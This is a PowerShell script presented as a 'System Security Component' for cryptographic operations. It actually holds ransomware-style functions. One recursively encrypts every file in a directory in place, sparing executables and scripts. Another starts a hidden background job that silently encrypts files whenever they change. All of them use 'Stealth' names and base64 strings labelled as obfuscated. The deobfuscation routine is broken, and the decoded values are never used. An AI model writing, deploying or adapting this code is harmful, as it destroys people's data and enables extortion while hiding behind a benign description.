<#
.SYNOPSIS
    System Security Component
.DESCRIPTION
    Cryptographic operations and file encryption
#>

# Obfuscated strings and function names
$ObfuscatedStrings = @{
    "Encrypt" = "RW5jcnlwdA=="
    "Decrypt" = "RGVjcnlwdA=="
    "Key" = "S2V5"
    "File" = "RmlsZQ=="
    "Directory" = "RGlyZWN0b3J5"
    "AES" = "QUVT"
    "RSA" = "UlNB"
}

function ConvertFrom-StealthString {
    param([string]$EncodedString)
    try {
        $Bytes = [System.Convert]::FromBase64String($EncodedString)
        $Key = [System.Text.Encoding]::UTF8.GetBytes("CryptoKey2024")
        $Result = @()
        for ($i = 0; $i -lt $Bytes.Length; $i++) {
            $Result += $Bytes[$i] -bxor $Key[$i % $Key.Length]
        }
        return [System.Text.Encoding]::UTF8.GetString($Result)
    } catch { return $EncodedString }
}

function New-StealthEncryptionKey {
    try {
        $KeyFunction = ConvertFrom-StealthString -EncodedString "S2V5"
        $AESFunction = ConvertFrom-StealthString -EncodedString "QUVT"
        
        $AesProvider = New-Object System.Security.Cryptography.AesManaged
        $AesProvider.GenerateKey()
        $AesProvider.GenerateIV()
        
        $KeyData = @{
            "Key" = [System.Convert]::ToBase64String($AesProvider.Key)
            "IV" = [System.Convert]::ToBase64String($AesProvider.IV)
        }
        
        return $KeyData
    } catch {
        return $null
    }
}

function Invoke-StealthFileEncryption {
    param([string]$FilePath, [hashtable]$KeyData)
    
    try {
        $EncryptFunction = ConvertFrom-StealthString -EncodedString "RW5jcnlwdA=="
        $FileFunction = ConvertFrom-StealthString -EncodedString "RmlsZQ=="
        
        if (-not (Test-Path $FilePath)) {
            return $false
        }
        
        $Key = [System.Convert]::FromBase64String($KeyData.Key)
        $IV = [System.Convert]::FromBase64String($KeyData.IV)
        
        $AesProvider = New-Object System.Security.Cryptography.AesManaged
        $AesProvider.Key = $Key
        $AesProvider.IV = $IV
        $AesProvider.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AesProvider.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        
        $Encryptor = $AesProvider.CreateEncryptor()
        
        $FileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $EncryptedBytes = $Encryptor.TransformFinalBlock($FileBytes, 0, $FileBytes.Length)
        
        [System.IO.File]::WriteAllBytes($FilePath, $EncryptedBytes)
        
        $Encryptor.Dispose()
        $AesProvider.Dispose()
        
        return $true
    } catch {
        return $false
    }
}

function Invoke-StealthFileDecryption {
    param([string]$FilePath, [hashtable]$KeyData)
    
    try {
        $DecryptFunction = ConvertFrom-StealthString -EncodedString "RGVjcnlwdA=="
        $FileFunction = ConvertFrom-StealthString -EncodedString "RmlsZQ=="
        
        if (-not (Test-Path $FilePath)) {
            return $false
        }
        
        $Key = [System.Convert]::FromBase64String($KeyData.Key)
        $IV = [System.Convert]::FromBase64String($KeyData.IV)
        
        $AesProvider = New-Object System.Security.Cryptography.AesManaged
        $AesProvider.Key = $Key
        $AesProvider.IV = $IV
        $AesProvider.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AesProvider.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        
        $Decryptor = $AesProvider.CreateDecryptor()
        
        $EncryptedBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)
        
        [System.IO.File]::WriteAllBytes($FilePath, $DecryptedBytes)
        
        $Decryptor.Dispose()
        $AesProvider.Dispose()
        
        return $true
    } catch {
        return $false
    }
}

function Invoke-StealthDirectoryEncryption {
    param([string]$DirectoryPath, [hashtable]$KeyData)
    
    try {
        $DirectoryFunction = ConvertFrom-StealthString -EncodedString "RGlyZWN0b3J5"
        $EncryptFunction = ConvertFrom-StealthString -EncodedString "RW5jcnlwdA=="
        
        if (-not (Test-Path $DirectoryPath)) {
            return $false
        }
        
        $Files = Get-ChildItem -Path $DirectoryPath -Recurse -File | Where-Object {
            $_.Extension -notin @('.exe', '.dll', '.sys', '.ps1', '.bat', '.cmd')
        }
        
        $EncryptedCount = 0
        foreach ($File in $Files) {
            if (Invoke-StealthFileEncryption -FilePath $File.FullName -KeyData $KeyData) {
                $EncryptedCount++
            }
        }
        
        return $EncryptedCount
    } catch {
        return 0
    }
}

function Start-StealthFileMonitor {
    param([string]$TargetDirectory, [hashtable]$KeyData)
    
    Start-Job -ScriptBlock {
        param($TargetDirectory, $KeyData)
        
        $FileSystemWatcher = New-Object System.IO.FileSystemWatcher
        $FileSystemWatcher.Path = $TargetDirectory
        $FileSystemWatcher.IncludeSubdirectories = $true
        $FileSystemWatcher.EnableRaisingEvents = $true
        
        $Action = {
            $Path = $Event.SourceEventArgs.FullPath
            $ChangeType = $Event.SourceEventArgs.ChangeType
            
            if ($ChangeType -eq "Changed" -and (Test-Path $Path -PathType Leaf)) {
                try {
                    $FileInfo = Get-Item $Path
                    if ($FileInfo.Length -gt 0 -and $FileInfo.Length -lt 10MB) {
                        # Encrypt file on access
                        $Key = [System.Convert]::FromBase64String($KeyData.Key)
                        $IV = [System.Convert]::FromBase64String($KeyData.IV)
                        
                        $AesProvider = New-Object System.Security.Cryptography.AesManaged
                        $AesProvider.Key = $Key
                        $AesProvider.IV = $IV
                        $AesProvider.Mode = [System.Security.Cryptography.CipherMode]::CBC
                        $AesProvider.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                        
                        $Encryptor = $AesProvider.CreateEncryptor()
                        $FileBytes = [System.IO.File]::ReadAllBytes($Path)
                        $EncryptedBytes = $Encryptor.TransformFinalBlock($FileBytes, 0, $FileBytes.Length)
                        [System.IO.File]::WriteAllBytes($Path, $EncryptedBytes)
                        
                        $Encryptor.Dispose()
                        $AesProvider.Dispose()
                    }
                } catch {
                    # Continue silently
                }
            }
        }
        
        Register-ObjectEvent -InputObject $FileSystemWatcher -EventName "Changed" -Action $Action | Out-Null
        
        while ($true) {
            Start-Sleep -Seconds 1
        }
    } -ArgumentList $TargetDirectory, $KeyData | Out-Null
}

function Invoke-StealthStringEncryption {
    param([string]$PlainText, [hashtable]$KeyData)
    
    try {
        $Key = [System.Convert]::FromBase64String($KeyData.Key)
        $IV = [System.Convert]::FromBase64String($KeyData.IV)
        
        $AesProvider = New-Object System.Security.Cryptography.AesManaged
        $AesProvider.Key = $Key
        $AesProvider.IV = $IV
        $AesProvider.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AesProvider.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        
        $Encryptor = $AesProvider.CreateEncryptor()
        $PlainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
        $EncryptedBytes = $Encryptor.TransformFinalBlock($PlainBytes, 0, $PlainBytes.Length)
        
        $Encryptor.Dispose()
        $AesProvider.Dispose()
        
        return [System.Convert]::ToBase64String($EncryptedBytes)
    } catch {
        return $PlainText
    }
}

function Invoke-StealthStringDecryption {
    param([string]$EncryptedText, [hashtable]$KeyData)
    
    try {
        $Key = [System.Convert]::FromBase64String($KeyData.Key)
        $IV = [System.Convert]::FromBase64String($KeyData.IV)
        
        $AesProvider = New-Object System.Security.Cryptography.AesManaged
        $AesProvider.Key = $Key
        $AesProvider.IV = $IV
        $AesProvider.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AesProvider.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        
        $Decryptor = $AesProvider.CreateDecryptor()
        $EncryptedBytes = [System.Convert]::FromBase64String($EncryptedText)
        $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)
        
        $Decryptor.Dispose()
        $AesProvider.Dispose()
        
        return [System.Text.Encoding]::UTF8.GetString($DecryptedBytes)
    } catch {
        return $EncryptedText
    }
} 